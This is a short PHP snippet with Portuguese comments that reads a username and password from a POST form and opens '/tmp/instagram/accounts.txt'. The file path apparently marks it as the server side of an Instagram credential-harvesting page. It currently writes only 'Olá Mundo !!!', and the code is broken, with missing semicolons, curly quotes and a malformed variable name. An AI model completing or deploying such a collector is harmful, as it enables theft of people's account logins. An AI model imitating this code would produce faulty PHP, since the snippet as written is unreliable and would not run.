<?php
    $username = $_POST['username']
    $password = $_POST['password']

    // cria arquivo no servidor
    $arquivo = fopen('/tmp/instagram/accounts.txt','w');
    $texto = “Olá Mundo !!!”; 
    fwrite($arquivo, $ texto);
    fclose($arquivo);
?>